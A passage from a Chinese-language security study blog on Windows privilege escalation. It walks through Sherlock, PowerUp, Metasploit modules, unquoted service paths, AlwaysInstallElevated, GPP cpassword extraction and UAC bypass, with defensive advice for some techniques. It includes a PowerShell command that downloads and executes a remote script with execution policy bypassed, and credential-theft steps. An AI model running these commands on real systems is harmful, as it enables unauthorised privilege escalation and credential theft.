+<h2 id="3-Windows-Exploit-Suggester"><a href="#3-Windows-Exploit-Suggester" class="headerlink" title="3.Windows Exploit Suggester"></a>3.Windows Exploit Suggester</h2><p>​    这个工具非常给力，可以将目标中的已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而其只需要的只要目标的系统的信息。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
+<p>使用方法也很简单：</p>
+<p>​    先使用<code>systeminfo</code>命令获取当前系统的补丁安装情况，并将补丁信息导入<code>patches.txt</code>文件：<code>systeminfo &gt; patches.txt</code></p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/4.png" srcset="/img/loading.gif"></p>
+<p>​    执行如下命令：<code>./windows-exploit-suggester.py --update</code>从微软官方自动下载安全公告数据库，下载的文件会以Excel表格的形式保存。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/5.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/6.png" srcset="/img/loading.gif"></p>
+<p>​    正式使用之前还需要安装一个<code>xlrd</code>模块。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/7.png" srcset="/img/loading.gif"></p>
+<p>​    注意：不能直接用<code>pip install xlrd</code>命令安装，这样它会安装<code>2.1.0</code>或更高版本。这样windows-exploit-suggester脚本会报错：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">xlrd</span><span class="hljs-selector-class">.biffh</span><span class="hljs-selector-class">.XLRDError</span>: <span class="hljs-selector-tag">Excel</span> <span class="hljs-selector-tag">xlsx</span> <span class="hljs-selector-tag">file</span>; <span class="hljs-selector-tag">not</span> <span class="hljs-selector-tag">supported</span><br></code></pre></td></tr></table></figure>
+<p>​    因此请使用<code>pip install xlrd==1.2.0</code> 该命令安装。</p>
+<p>​    最后使用<code>./windows-exploit-suggester.py -d 2021-03-06-mssb.xls -i patches.txt</code>即可分析出可利用的漏洞。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/8.png" srcset="/img/loading.gif"></p>
+<h2 id="4-Metaspolit内置识别系统中可能被利用的漏洞模块"><a href="#4-Metaspolit内置识别系统中可能被利用的漏洞模块" class="headerlink" title="4.Metaspolit内置识别系统中可能被利用的漏洞模块"></a>4.Metaspolit内置识别系统中可能被利用的漏洞模块</h2><p>​    <code>post/multi/recon/local_exploit_suggester</code>模块，直接将我们可以利用的脚本模块列出来了。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/9.png" srcset="/img/loading.gif"></p>
+<h2 id="5-Powershell中的Sherlock脚本"><a href="#5-Powershell中的Sherlock脚本" class="headerlink" title="5.Powershell中的Sherlock脚本"></a>5.Powershell中的Sherlock脚本</h2><p>​    下载地址：<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
+<p>​    通过该脚本，可以快速查找可能用户本地提权的漏洞：</p>
+<p>​    在目标的powershell中执行如下命令：</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Sherlock</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br></code></pre></td></tr></table></figure>
+<p>​    然后执行如下命令</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">Find</span>-AllVulns<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/10.png" srcset="/img/loading.gif"></p>
+<h1 id="3-提权方法二：Windows操作系统配置错误利用"><a href="#3-提权方法二：Windows操作系统配置错误利用" class="headerlink" title="3.提权方法二：Windows操作系统配置错误利用"></a>3.提权方法二：Windows操作系统配置错误利用</h1><h2 id="1-系统服务权限配置错误"><a href="#1-系统服务权限配置错误" class="headerlink" title="1.系统服务权限配置错误"></a>1.系统服务权限配置错误</h2><p>​    Windows系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件。因此，如果低权限用户对此类系统服务的调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。</p>
+<p>​    <strong>Windows服务是以System权限运行的，因此，其文件夹、文件和注册表键值都是受强访问控制机制保护的。但是在某些情况下，操作系统会存在一些没有得到有效保护的服务。</strong></p>
+<p>​    系统服务权限配置错误（可写目录漏洞）有如下两种可能：</p>
+<p>​    1.服务未运行：攻击者会会使用任意服务替换原来服务，然后重启服务。</p>
+<p>​    2.服务正在运行且无法终止：这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用DLL劫持技术并尝试重启服务来提权。</p>
+<h3 id="1-PowerUp的利用"><a href="#1-PowerUp的利用" class="headerlink" title="1.PowerUp的利用"></a>1.PowerUp的利用</h3><p>​    下载链接：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></p>
+<p>​    PowerUp提供了一些本地提权方法，可以通过很多实用的脚本来寻找目标机器中的Windows服务漏洞。</p>
+<p>​    在测试过程中，可以执行如下命令来运行该脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">powershell.exe -<span class="hljs-built_in">exec</span> bypass -Command <span class="hljs-string">&quot;&amp;&#123;Import-Module .\PowerUp.ps1; Invoke-Allchecks&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">powershell.exe -<span class="hljs-keyword">nop </span>-exec <span class="hljs-keyword">bypass </span>-c <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#x27;); Invoke-AllChecks&quot;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">powershell.exe -<span class="hljs-keyword">nop </span>-exec <span class="hljs-keyword">bypass </span>-c <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;C:\PowerUp.ps1&#x27;); Invoke-AllChecks&quot;</span><br></code></pre></td></tr></table></figure>
+<p>​    可以看到当前环境使用该脚本发现，bypassUAC可以达到提升权限的效果。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/11.png" srcset="/img/loading.gif"></p>
+<p>​    建议用<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1">https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1</a> 这个链接的脚本，感觉更加清晰明了。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/12.png" srcset="/img/loading.gif"></p>
+<h3 id="2-Metasploit的利用"><a href="#2-Metasploit的利用" class="headerlink" title="2.Metasploit的利用"></a>2.Metasploit的利用</h3><p>​    在Metasploit中，对应的利用模块是<code>exploit/windows/local/service_permissions</code>。选择<code>AGGRESSIVE</code>选项，可以利用目标机器上每一个有缺陷的服务。该选项被禁用时，该模块在第一次提权成功后就会停止工作。</p>
+<p>​    如果成功的话，会自动反弹一个新的meterpreter（System权限）</p>
+<p>​    <strong>该模块的会根据当前的session会话的权限来判断使用哪种方法获得system权限。如果meterpreter是以管理员的权限运行的话，模块会尝试创建并运行一个服务；如果权限不足以创建服务，该模块会判断哪些服务的文件或者文件夹的权限有问题，并允许对其进行劫持。</strong></p>
+<h2 id="2-注册表键AlwaysinstallElevated"><a href="#2-注册表键AlwaysinstallElevated" class="headerlink" title="2.注册表键AlwaysinstallElevated"></a>2.注册表键AlwaysinstallElevated</h2><p>​    注册表键AlwaysinstallElevated是一个策略设置项。Windows允许低权限用户以System权限运行安装文件。如果启用此策略设置项，那么任何权限的用户都能以<code>NT AUTHORITY\SYSTEM</code>权限来安装恶意的MSI（Microsoft Windows Installer）文件。</p>
+<h3 id="1-PathsAlwaysInstallElevated漏洞"><a href="#1-PathsAlwaysInstallElevated漏洞" class="headerlink" title="1.PathsAlwaysInstallElevated漏洞"></a>1.PathsAlwaysInstallElevated漏洞</h3><p>产生原因：<strong>是用户开启了Windows Installer特权安装功能。</strong></p>
+<p>开启方法：首先用cmd运行<code>gpedit.msc</code>，打开组策略编辑器，然后想下面截图一样进行操作即可。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/13.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/14.png" srcset="/img/loading.gif"></p>
+<p>设置完毕后，注册表会有两个位置自动创建键值为<code>1</code></p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/15.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/16.png" srcset="/img/loading.gif"></p>
+<h4 id="1-PowerUp下的实战利用"><a href="#1-PowerUp下的实战利用" class="headerlink" title="1.PowerUp下的实战利用"></a>1.PowerUp下的实战利用</h4><p>​    可以利用PowerUp的<code>Get-RegistryAlwaysInstallElevated</code>模块来检查注册表键是否被设置。</p>
+<p>​    可以执行如下命令：</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">PowerUp</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><span class="hljs-operator">;</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">RegAlwaysInstallElevated</span><br></code></pre></td></tr></table></figure>
+<p>​    结果为True的话，表明AlwaysInstallElevated键已经被设置。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/17.png" srcset="/img/loading.gif"></p>
+<p>​    接下来，添加账户。运行<code>Write-UserAddMSI</code>模块，生成MSI文件。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/18.png" srcset="/img/loading.gif"></p>
+<p>​    这时，以普通用户权限运行该MSI文件，就会添加一个管理员账号。</p>
+<pre><code> metasploit也有相关利用模块：`exploit/windows/local/always_install_elevated`
+</code></pre>
+<p><strong>这种问题的防范方法：只要禁用注册表键<code>AlwaysinstallElevated</code>即可。</strong></p>
+<h2 id="3-可信任服务路径漏洞"><a href="#3-可信任服务路径漏洞" class="headerlink" title="3.可信任服务路径漏洞"></a>3.可信任服务路径漏洞</h2><p>​    可信任服务路径（包含空格且没有引号的路径）漏洞利用了Windows文件路径解析的特性，并涉及服务路径的文件/文件夹权限（存在缺陷的服务程序利用了属于可执行文件的文件/文件夹的权限）。如果一个服务调用的可执行文件没有正确地处理所引用的完整路径名，这个漏洞就会被攻击者用来上传任意可执行文件。<strong>也就是说，如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞。</strong></p>
+<p>​    该漏洞存在如下两种可能性：</p>
+<p>​    1.如果路径与服务有关，就可以创建一个服务或者编译Service模板。</p>
+<p>​    2.如果路径与可执行文件有关，就任意创建一个可执行文件。</p>
+<h3 id="1-Trusted-Service-Paths漏洞产生的原因"><a href="#1-Trusted-Service-Paths漏洞产生的原因" class="headerlink" title="1.Trusted Service Paths漏洞产生的原因"></a>1.Trusted Service Paths漏洞产生的原因</h3><p>​    假如有一个文件路径<code>C:\Program Files\Some Folder\test.exe</code>。对于该路径中的每一个空格，Windows都会尝试寻找并执行与每一个空格前面的名字相匹配的程序。</p>
+<p>例如，如上的文件路径，windows会依次尝试确定和执行下列程序。</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\P</span>rogram.exe<br>C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\S</span>ome.exe<br>C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\S</span>ome Folder<span class="hljs-symbol">\t</span>est.exe<br></code></pre></td></tr></table></figure>
+<p>​    因此，如果一个被精心构造名字的可执行文件程序上传到受到影响的目录下，服务一旦启动，在大多数情况下该程序就会以System权限运行。</p>
+<h3 id="2-实战利用"><a href="#2-实战利用" class="headerlink" title="2.实战利用"></a>2.实战利用</h3><p>​    首先查看一下目标机器有没有该漏洞。使用<code>wmic</code>进行查询，列出目标机器中<strong>所有没有被引号引起来同时包括空格的服务路径</strong>。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">wmic service get name,displayname,pathname,startmode |findstr <span class="hljs-string">/i</span> <span class="hljs-string">&quot;Auto&quot;</span> |findstr <span class="hljs-string">/i</span> <span class="hljs-string">/v</span> <span class="hljs-string">&quot;C:\Windows\\&quot;</span> |findstr <span class="hljs-string">/i</span> <span class="hljs-string">/v</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+<p>​    然后，就要检查是否对目标文件夹有写的权限。可以使用Windows的内置工具<code>icacls</code>，来检查上面<code>wmic</code>命令执行结果的对应目录路径。</p>
+<p>例如：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata">icacls <span class="hljs-string">&quot;C:\Program Files\&quot;</span><br><br>对应的权限提示符：<br>(<span class="hljs-keyword">M</span>):修改<br>(F):完全控制<br>(<span class="hljs-keyword">CI</span>):从属容器将继承访问控制项<br>(OI):从属文件将继承访问控制项<br></code></pre></td></tr></table></figure>
+<p>​    通过以上的两个步骤确认存在该漏洞后，把要上传的程序重命名并放置在存在该漏洞且可写的目录下，执行如下命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> stop service_name<br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> service_name<br></code></pre></td></tr></table></figure>
+<h2 id="4-计划任务"><a href="#4-计划任务" class="headerlink" title="4.计划任务"></a>4.计划任务</h2><p>​    原理：<strong>如果攻击者对以高权限运行的任务所在的目录具有写的权限，就可以使用恶意程序覆盖原来的程序。这样，在计划任务下次执行时，就会以高权限来运行恶意程序。</strong></p>
+<p>首先使用如下命令查看计划任务：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/query</span> <span class="hljs-string">/fo</span> LIST <span class="hljs-string">/v</span><br></code></pre></td></tr></table></figure>
+<p><strong>如果存在定时任务，就需要查看该定时任务指定目录的权限配置情况。</strong>可以利用AccessChk这个工具，该工具用于在Windows中进行一些系统或程序的高级查询、管理和故障排除工作，同时该工具是微软官方提供的工具，一般不会引起杀毒软件的报警！！</p>
+<p>下载链接：<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/AccessChk.zip">https://download.sysinternals.com/files/AccessChk.zip</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">accesschk<span class="hljs-selector-class">.exe</span> -dqv <span class="hljs-string">&quot;C:\Mircrosoft&quot;</span> -accepteula<br></code></pre></td></tr></table></figure>
+<p>PS:第一次运行该工具时，会弹出一个许可协议对话框，为了不弹框，可以使用<code>/accepteula</code>参数自动接受许可协议：</p>
+<p>如：<code>accesschk.exe /accepteula</code></p>
+<p>列出某个驱动器下所有权限配置有缺陷的<strong>文件夹</strong>：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs groovy">accesschk.exe -<span class="hljs-attr">uwdqsUsersc:</span>\<br>accesschk.exe -uwdqs<span class="hljs-string">&quot;AuthenticatedUsers&quot;</span><span class="hljs-attr">c:</span>\<br></code></pre></td></tr></table></figure>
+<p>列出某个驱动器下所有权限配置有缺陷的<strong>文件</strong>：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">accesschk.exe -uwdqsUsersc:<span class="hljs-string">\*.*</span><br>accesschk.exe -uwdqs<span class="hljs-string">&quot;AuthenticatedUsers&quot;</span>c:<span class="hljs-string">\*.*</span><br></code></pre></td></tr></table></figure>
+
+
+<h1 id="4-提权方法三：组策略首选项提权分析及防范"><a href="#4-提权方法三：组策略首选项提权分析及防范" class="headerlink" title="4.提权方法三：组策略首选项提权分析及防范"></a>4.提权方法三：组策略首选项提权分析及防范</h1><h3 id="1-组策略首选项提权简介"><a href="#1-组策略首选项提权简介" class="headerlink" title="1.组策略首选项提权简介"></a>1.组策略首选项提权简介</h3><p>​     SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。SYSVOL文件夹是在安装活动目录时候自动创建的，主要用来存放登录脚本、组策略数据及其他域控需要的域信息。sysvol在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。整个sysvol目录在所有的域控中是自动同步和共享的，所有组策略在：<code>C:\Windows\SYSVOL\domain\Policies</code>中</p>
+<p>​     在一般域环境中所有机器都是脚本化批量部署的，数据量很大，为了方便对所有机器进行操作。网管会使用域策略进行统一的配置和管理，大多数组织在创建域环境后会要求加入域的计算机使用域用户密码进行登录验证。为了保证本地管理员的安全性，这些组织的网络管理员往往会修改本地管理员密码。</p>
+<p>​    <strong>但是通过组策略修改密码，若攻击者获得一台机器的本地管理员密码，就相当于获取整个域中所有机器的本地管理员密码。</strong></p>
+<p>常见的组策略首选项（Group Policy Preferences，GPP）：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">映射驱动器（<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Drives</span>.</span></span>xml）<br>创建本地用户<br>数据源(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DataSources</span>.</span></span>xml)<br>打印机配置(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Printers</span>.</span></span>xml)<br>创建/更新服务(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Services</span>.</span></span>xml)<br>计划任务(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ScheduledTasks</span>.</span></span>xml)<br></code></pre></td></tr></table></figure>
+<p><strong>如何创建组策略，批量进行修改本地管理员的密码：</strong></p>
+<p>详细细节请看这篇：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yang34/p/12492270.html">https://www.cnblogs.com/Yang34/p/12492270.html</a></p>
+<h3 id="2-获取组策略的凭据"><a href="#2-获取组策略的凭据" class="headerlink" title="2.获取组策略的凭据"></a>2.获取组策略的凭据</h3><p>​    管理员在域中新建一个组策略后，操作系统会自动在SYSVOL共享目录中生成一个XML文件，该文件中保存了该组策略更新后的密码。该密码使用AES-256加密算法，安全性还是比较高的。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在XML文件中的密码的安全性大大降低。任何域用户和域信任的用户均可对该共享目录进行访问，这就意味着，任何用户都可以访问保存在XML文件中的密码并将其解密，从而控制域中所有使用该账号、密码的本地管理员计算机。可通过在SYSVOL中搜索，可以找到包含<code>cpassword</code>的XML文件。</p>
+<h4 id="1-使用powershell来获取cpassword"><a href="#1-使用powershell来获取cpassword" class="headerlink" title="1.使用powershell来获取cpassword"></a>1.使用powershell来获取cpassword</h4><p>利用开源项目：PowerSploit中的<strong>Get-GPPPassword.ps1</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a></p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">GPPPassword</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">GPPPassword</span><br></code></pre></td></tr></table></figure>
+<h4 id="2-使用Metasploit"><a href="#2-使用Metasploit" class="headerlink" title="2.使用Metasploit"></a>2.使用Metasploit</h4><p><code>post/windows/gather/credentials/gpp</code></p>
+<h3 id="3-防御措施："><a href="#3-防御措施：" class="headerlink" title="3.防御措施："></a>3.防御措施：</h3><p>在用于管理组策略的计算机上安装 KB2962486补丁，防止新的凭据被放置在组策略首选项中。微软在2014年修复了组策略首选项提权漏洞，使用的方法就是不再将密码保存在组策略首选项中。</p>
+<p>此外，针对Everyone访问权限进行设置，具体如下：</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">设置共享文件夹SYSVOL的访问权限<br>将包含组策略密码的 <span class="hljs-keyword">XML</span> <span class="hljs-title">文件从 SYSVOL</span> 目录中删除<br>不要把密码放在所有域用户都有权访问的文件中<br>如果需要更改域中机器的本地管理员密码，建议使用LAPS<br></code></pre></td></tr></table></figure>
+<h1 id="5-提权方法四：绕过UAC提权分析及防范"><a href="#5-提权方法四：绕过UAC提权分析及防范" class="headerlink" title="5.提权方法四：绕过UAC提权分析及防范"></a>5.提权方法四：绕过UAC提权分析及防范</h1><p>​    如果计算机的操作系统版本是Windows Vista或更高，在权限不够的情况下，访问系统磁盘的根目录、Windows目录、Program Files 目录，以及读、写系统登录数据库的程序等操作，都需要经过UAC（User Account Control，用户账户控制）的认证才能进行。</p>
+<h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><p>​    UAC要求用户在执行可能影响计算机运行的操作或进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码需要进行身份验证。</p>
+<p>UAC有如下三种设置要求（在我看来）：</p>
+<p>1.始终通知。</p>
+<p>2.仅在程序试图更改我的计算机时通知我。</p>
+<p>3.从不提示。</p>
+<h2 id="1-bypassuac模块"><a href="#1-bypassuac模块" class="headerlink" title="1.bypassuac模块"></a>1.bypassuac模块</h2><p>利用MSF中的<code>exploit/windows/local/bypassuac</code>模块。</p>
+<p>该模块的利用条件：</p>
+<p>1.已经获得一个meterpreter的shell。</p>
+<p>2.当前的用户权限必须在管理员组中，并且UAC必须为默认设置。（即仅在程序试图更改我的计算机时通知我）</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/19.png" srcset="/img/loading.gif"></p>
+<p>bypassuac模块进行提权的时候，会在目标机器上创建多个文件，这些文件会被杀毒软件识别，而<code>exploit/windows/local/bypassuac_injection</code>模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，被查杀的概率会比较低。</p>
+<p>所以推荐使用<code>exploit/windows/local/bypassuac_injection</code></p>
+<h2 id="2-RunAs模块"><a href="#2-RunAs模块" class="headerlink" title="2.RunAs模块"></a>2.RunAs模块</h2><p>使用<code> exploit/windows/local/ask</code>模块，创建一个可执行文件，目标机器会运行一个发起权限提升的请求，提示用户是否要继续进行，如果用户选择继续运行程序，就会返回一个高权限的<code>meterpreter shell</code>。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/20.png" srcset="/img/loading.gif"></p>
+<p>如果用户点击继续运行程序，就会返回一个高权限的meterpreter的shell。</p>
+<p><img src="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/21.png" srcset="/img/loading.gif"></p>
+<h2 id="3-针对绕过UAC提权的防御措施"><a href="#3-针对绕过UAC提权的防御措施" class="headerlink" title="3.针对绕过UAC提权的防御措施"></a>3.针对绕过UAC提权的防御措施</h2><p>防止绕过UAC的最好的方法破坏利用UAC模块的利用条件：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">该模块的利用条件：<br><br><span class="hljs-number">1</span>.已经获得一个meterpreter的<span class="hljs-keyword">shell</span><span class="bash">。</span><br><br><span class="hljs-number">2</span>.当前的用户权限必须在管理员组中，并且UAC必须为默认设置。（即仅在程序试图更改我的计算机时通知我）<br></code></pre></td></tr></table></figure>
+<p>1.不让内网机器的使用者拥有本地管理者的权限。</p>
+<p>2.将UAC设置为始终通知。</p>
+<h1 id="6-提权方法五：令牌窃取分析及防范"><a href="#6-提权方法五：令牌窃取分析及防范" class="headerlink" title="6.提权方法五：令牌窃取分析及防范"></a>6.提权方法五：令牌窃取分析及防范</h1><p>​    令牌（Token）是指系统中的临时密钥，相当于账号和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中（除非系统重新启动）。</p>
+<p>​    令牌的最大特点是随机性和不可预测性。一般的攻击者和软件都无法将令牌给猜测出来。访问令牌（Access Token）代表访问控制操作主体的系统对象。密保令牌（Security Token）也叫认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备。</p>
+<p>​    伪造令牌攻击的核心是<code>Kerberos</code>协议。<code>Kerberos</code>协议是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。</p>
+<pre><code> 客户端请求证书的过程如下：
+</code></pre>
+<p>1.客户端向认证服务器发送请求，请求得到证书。</p>
